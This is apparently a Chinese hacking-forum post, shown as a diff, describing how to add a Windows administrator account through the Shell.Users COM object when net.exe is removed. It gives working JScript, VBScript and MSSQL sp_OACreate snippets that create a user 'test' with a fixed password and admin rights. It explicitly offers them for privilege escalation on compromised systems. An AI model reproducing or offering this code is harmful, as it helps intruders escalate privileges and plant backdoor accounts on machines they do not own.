@@ -1,0 +1,36 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+命令行下一种新的加帐号的方法
+D8888D主贴内容-------------------------------------------------------
+ 
+
+这篇文章是本人在逛别人的博客的时候发现的 但作者不记得了  先发出来大伙看看吧
+
+今天研究了一下用户控制面板文件nusrmgr.cpl，发现调用的是Shell.Users来加用户，它还同时调用了 wscript.shell、Shell.Application、Shell.LocalMachine这三个组件。不过加用户的话，这一个 Shell.Users就足够了。那么可能在删掉了net.exe和不用adsi之外，这也可能是一种新的加用户的方法。代码如下：
+
+js:
+
+var o=new ActiveXObject( "Shell.Users" );z=o.create("test") ;z.changePassword("123456","")z.setting("AccountType")=3;
+
+vbs:
+
+Set o=CreateObject( "Shell.Users" )
+
+Set z=o.create("test")
+
+z.changePassword "123456",""
+
+z.setting("AccountType")=3
+
+
+DECLARE @o int
+DECLARE @z int
+
+EXEC sp_OACreate 'Shell.Users',@o OUT
+
+EXEC sp_OAMethod @o, 'Create', @z OUT, 'test'
+EXEC sp_OASetProperty  @z, 'setting', 3 , 'AccountType'
+EXEC sp_OAMethod @z, 'ChangePassword',NULL , '123456', ''
+
+希望这些对各位提权的时候有用
